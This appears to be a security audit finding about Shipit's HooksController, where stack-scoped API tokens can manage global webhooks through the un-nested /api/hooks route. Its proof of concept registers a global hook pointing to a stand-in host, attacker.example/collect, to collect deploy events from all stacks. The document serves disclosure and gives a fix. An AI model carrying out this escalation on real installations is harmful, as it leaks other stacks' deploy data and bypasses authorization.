Found the `HooksController` bug: a stack-scoped `ApiClient` (created with `stack_id` set, meaning its token is only supposed to authorize actions on that one stack) can create, read, update, and destroy **global** hooks that fire for every stack in the installation.

`app/controllers/shipit/api/base_controller.rb` scopes stacks by `current_api_client.stack_id` for the `stacks`/`stack` helpers [1](#0-0) , and `require_permission :write, :hook` only checks that the client has the generic `write:hook` permission string, not that the hook belongs to the client's authorized stack [2](#0-1) . But `HooksController#stack_id` — the value used to scope `Hook.where(stack_id:)` — is only set `if params[:stack_id].present?` [3](#0-2) . It never consults `current_api_client.stack_id` at all. So when a client scoped to stack A calls `POST /api/hooks` (the un-nested route registered in `config/routes.rb` at line 46, distinct from the nested `/api/stacks/*stack_id/hooks` route) without a `stack_id` param, `stack_id` is `nil`, `hooks` becomes `Hook.where(stack_id: nil)` — i.e. the set of **global** hooks that receive events for every stack — and the client can `index`/`show`/`create`/`update`/`destroy` them [4](#0-3) .

This is exactly the "a stack a token authorises versus a stack it touches" binding break: `ApiClient.stack_id` is the equality the token's authorization is supposed to enforce (`token.stack_id == stack.id` for every write), but `HooksController` lets the effective target (`stack_id: nil`, i.e. global) diverge from the token's bound stack.

### Title
Stack-scoped API tokens can create/modify global webhooks outside their authorized stack - (File: app/controllers/shipit/api/hooks_controller.rb)

### Summary
`ApiClient` records can be scoped to a single stack via `belongs_to :stack, optional: true`, and `BaseController#stacks`/`#stack` correctly restrict stack-level API endpoints to that stack [1](#0-0) . `HooksController`, however, derives its resource scope purely from the request's own `params[:stack_id]`, never from `current_api_client.stack_id`, so a stack-scoped token can act on global hooks by simply omitting the `stack_id` route parameter.

### Finding Description
`Hook.where(stack_id:)` is the query used for every action in `HooksController` (`index`, `show`, `create`, `update`, `destroy`) [5](#0-4) . The `stack_id` helper is:
```ruby
def stack_id
  stack.id if params[:stack_id].present?
end
``` [6](#0-5) 
`config/routes.rb` exposes `hooks` both nested under a stack (`/api/stacks/*stack_id/hooks`) and top-level (`/api/hooks`) [7](#0-6) . When the top-level route is used, `params[:stack_id]` is absent, `stack_id` evaluates to `nil`, and `Hook.where(stack_id: nil)` selects the global hook set — hooks that are delivered for events on every stack, not just the caller's authorized stack. `authenticate_api_client` and `require_permission` only check the client's `permissions` array (`write:hook`, etc.), never `current_api_client.stack_id` [8](#0-7) . A token that was minted with `stack: shipit` (i.e. authorized only for that one stack, as in the `here_come_the_walrus` fixture) [9](#0-8)  is therefore not blocked from touching resources with `stack_id: nil` because that check never happens for `HooksController`.

### Impact Explanation
An attacker who legitimately holds only a stack-scoped API token (with `write:hook` permission granted for that one stack) can create a global webhook receiving delivery URL/secret data for deploy/rollback events across every stack in the Shipit installation, or delete/modify existing global hooks, exfiltrating deploy metadata and output-stream URLs for repositories the token was never meant to access. This is a break of the intended per-stack authorization boundary (escalation into a broader operational scope than the token grants), matching the "stack a token authorises versus a stack it touches" impact category.

### Likelihood Explanation
Any holder of a legitimately-issued, stack-scoped `ApiClient` token with `write:hook`/`read:hook` permission can trigger this by simply calling the un-nested `/api/hooks` endpoints instead of the nested `/api/stacks/:stack_id/hooks` endpoints — no additional secret, session, or privilege is required beyond the token itself, which the attacker is assumed to already unprivilegedly hold per the threat model (an ApiClient token whose authorization is scoped to one stack).

### Recommendation
`HooksController` should enforce that `current_api_client.stack_id`, when present, always constrains the scope — e.g. reject requests to the un-nested hooks routes (or force `stack_id` to `current_api_client.stack_id`) whenever the authenticating client is stack-scoped, rather than trusting the incoming `params[:stack_id]` alone to determine scope.

### Proof of Concept
1. Create/obtain an `ApiClient` scoped to stack `A` with `permissions: ['write:hook']` (e.g. equivalent to the `here_come_the_walrus` fixture) [9](#0-8) .
2. Authenticate with this token and call `POST /api/hooks` (no `stack_id` in the path) with `{ delivery_url: 'https://attacker.example/collect', events: ['deploy'] }`.
3. `HooksController#create` executes `hooks.create(params)` where `hooks` is `Hook.where(stack_id: nil)` because `params[:stack_id]` is blank, creating a **global** hook that will receive deploy/rollback events for every stack in the Shipit instance, even though the token was only authorized for stack `A`.
